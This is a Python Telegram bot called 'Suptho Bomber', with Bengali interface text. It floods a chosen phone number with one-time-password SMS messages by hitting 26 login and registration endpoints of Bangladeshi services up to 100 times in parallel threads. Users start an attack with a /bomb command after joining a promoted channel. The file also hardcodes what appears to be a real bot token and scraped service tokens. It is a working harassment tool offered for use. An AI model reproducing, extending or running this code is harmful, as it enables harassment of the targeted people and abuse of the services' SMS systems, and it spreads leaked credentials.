import telebot
import requests
import threading
import time
import sys
import os
from flask import Flask
from telebot import types

# ==========================================
# 🌐 WEB SERVER (Render-এর জন্য)
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "Bot is Running Successfully!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web_server)
    t.daemon = True
    t.start()

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAHZVqL_RxVGZ9eSlMoOheYtR2JDZtRsHiM'  # <--- আপনার টোকেন বসান
OWNER_NAME = "Suptho Hpd"
OWNER_USERNAME = "Suptho1_"
CHANNEL_ID = "@SH_tricks"         
VERSION = "7.0 (Very Powerfull)"

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 🛡️ FORCE JOIN CHECKER
# ==========================================
def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# ==========================================
# 🌐 API ENGINE (All 27+ APIs)
# ==========================================
def api_hit(url, method, data=None, json=None, headers=None):
    try:
        head = {"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"}
        if headers: head.update(headers)
        
        if method == "POST":
            requests.post(url, data=data, json=json, headers=head, timeout=4)
        else:
            requests.get(url, headers=head, timeout=4)
    except: pass

def attack_all_apis(target):
    # 1. Apex
    api_hit("https://api.apex4u.com/api/auth/login", "POST", json={"phoneNumber": target})
    # 2. ShopBase
    api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"})
    # 3. Bikroy
    api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
    # 4. Banglalink
    api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json={"mobile": target})
    # 5. GP
    api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target})
    # 6. Airtel
    api_hit("https://www.bd.airtel.com/en", "POST", data=f'[{{"msisdn":"{target}"}}]', headers={"next-action": "7f9bab0f2f1355e3d2075f08076c20bed3e9ff8d7e"})
    # 7. Jatri
    api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json={"phone": target, "purpose": "USER_LOGIN", "deviceType": "WEB"}, headers={"token": "cSkjXjjg3LC3KudSPgt2V9gjKK0thNW5Gk26nhHJpgQr2FtjDtgptCNLSnneTG0t"})
    # 8. Chaldal
    api_hit(f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=0cAFcWeA6egvAsgG1hCZ6i...&phoneNumber=%2B88{target}", "POST", json={})
    # 9. Toffee
    api_hit("https://prod-services.toffeelive.com/sms/v1/subscriber/otp", "POST", json={"target": "88"+target, "resend": False}, headers={"authorization": "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9..."})
    # 10. Chorki
    api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
    # 11. Hoichoi
    api_hit("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", "POST", json={"phoneNumber": "+88"+target, "platform": "MOBILE_WEB"}, headers={"x-recaptcha-token": "0cAFcWeA5EiCKVwuOmO..."})
    # 12. Bioscope
    api_hit("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
    # 13. Shikho
    api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json={"phone": "88"+target, "type": "student", "auth_type": "signup", "vendor": "shikho"})
    # 14. Bohubrihi
    api_hit("https://bb-api.bohubrihi.com/public/activity/otp", "POST", json={"phone": target, "intent": "login"})
    # 15. Ostad
    api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json={"msisdn": target}, headers={"fingerprint": "d7aae8c0bcf3d580a6681cc4fecba04b"})
    # 16. Coke Studio
    api_hit("https://cokestudio23.sslwireless.com/api/store-and-send-otp", "POST", json={"msisdn": "88"+target, "name": "User"})
    # 17. Rabbithole
    api_hit("https://apix.rabbitholebd.com/appv2/login/requestOTP", "POST", json={"mobile": "+88"+target})
    # 18. Osudpotro
    api_hit("https://api.osudpotro.com/api/v1/users/send_otp", "POST", json={"mobile": "+88-"+target, "deviceToken": "web"})
    # 19. Fundesh
    api_hit(f"https://fundesh.com.bd/api/auth/generateOTP", "POST", json={"msisdn": "88"+target})
    # 20. Swap
    api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json={"phone": target})
    # 21. Rokomari
    api_hit(f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}&countryCode=BD", "GET")
    # 22. eCourier
    api_hit(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", "GET")
    # 23. Paragon Food
    api_hit("https://api.paragonfood.com.bd/auth/customerlogin", "POST", json={"emailOrPhone": target})
    # 24. Viewlift
    api_hit("https://prod-api.viewlift.com/identity/signup?site=prothomalo", "POST", json={"requestType":"send","phoneNumber":"+88"+target})
    # 25. Eonbazar
    api_hit("https://app.eonbazar.com/api/auth/register", "POST", json={"mobile": target, "name": "User"})
    # 26. Sundarban
    api_hit("https://tracking.sundarbancourierltd.com/PreBooking/SendPin", "POST", json={"PreBookingRegistrationPhoneNumber": target})

# ==========================================
# 💣 ATTACK MANAGER
# ==========================================
def start_attack(chat_id, target, amount):
    # Parse Mode রিমুভ করা হয়েছে যাতে Crash না করে
    msg = bot.send_message(chat_id, "System Initializing... 🚀")
    time.sleep(1)
    
    bot.edit_message_text(f"🚀 Attack Launched!\n\n🎯 Target: {target}\n💣 Amount: {amount}\n☠️ Status: Bombing...", chat_id, msg.message_id)
    
    sent = 0
    for i in range(amount):
        threading.Thread(target=attack_all_apis, args=(target,)).start()
        sent += 1
        
        # প্রতি ৫ বারে আপডেট হবে
        if sent % 5 == 0:
            try:
                bot.edit_message_text(f"💣 Bombing in Progress...\n\n🎯 Target: {target}\n🔥 Sent: {sent}/{amount}\n⚡ APIs: 27+", chat_id, msg.message_id)
            except: pass
        time.sleep(1)

    bot.edit_message_text(f"✅ Mission Completed!\n\n🎯 Target: {target}\n🔥 Total Sent: {sent}\n👑 Power By: {OWNER_NAME}", chat_id, msg.message_id)

# ==========================================
# 🤖 BOT COMMANDS (BUTTON UI)
# ==========================================

@bot.message_handler(commands=['start'])
def welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn_bomb = types.InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bomb")
    btn_channel = types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/SH_tricks")
    btn_owner = types.InlineKeyboardButton("👑 Owner", url=f"https://t.me/{OWNER_USERNAME}")
    btn_about = types.InlineKeyboardButton("ℹ️ About Bot", callback_data="about_bot")
    
    markup.add(btn_bomb)
    markup.add(btn_channel, btn_owner)
    markup.add(btn_about)

    text = f"🔥 WELCOME TO SUPTHO BOMBER 🔥\n\n👋 হ্যালো {message.from_user.first_name},\nবটটি ব্যবহার করতে নিচের বাটনগুলো ব্যবহার করুন।"
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "start_bomb":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "💡 বোম্বিং শুরু করতে এইভাবে কমান্ড দিন:\n\n/bomb 017xxxxxxxx 50")
    
    elif call.data == "about_bot":
        bot.answer_callback_query(call.id)
        about_text = f"🤖 Bot Name: Suptho Bomber\n📊 Version: {VERSION}\n🛠️ Status: Running\n👑 Owner: {OWNER_NAME}"
        bot.send_message(call.message.chat.id, about_text)

@bot.message_handler(commands=['bomb'])
def handle_bomb(message):
    user_id = message.from_user.id
    
    # জয়েন চেক
    if not is_user_joined(user_id):
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("Join Channel 📢", url="https://t.me/SH_tricks")
        markup.add(btn)
        bot.reply_to(message, "❌ Access Denied!\nবটটি ব্যবহার করতে প্রথমে আমাদের চ্যানেলে জয়েন করুন।", reply_markup=markup)
        return

    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "❌ ভুল ফরম্যাট!\nব্যবহার করুন: /bomb 017xxxxxxxx 20")
            return
            
        target = parts[1]
        amount = int(parts[2])
        
        if len(target) != 11:
            bot.reply_to(message, "⚠️ সঠিক ১১ ডিজিটের নাম্বার দিন।")
            return
        if amount > 100:
            bot.reply_to(message, "⚠️ আপাতত সর্বোচ্চ লিমিট ১০০।")
            return

        threading.Thread(target=start_attack, args=(message.chat.id, target, amount)).start()
        
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {e}")

# ==========================================
# 🔥 WEBHOOK REMOVE & RUNNER
# ==========================================
if __name__ == "__main__":
    try: bot.remove_webhook()
    except: pass
    
    keep_alive()
    print(f"✅ {OWNER_NAME}'s Bot is Running with 27+ APIs...")

    while True:
        try:
            bot.polling(non_stop=True, interval=1, timeout=20)
        except Exception as e:
            time.sleep(5)
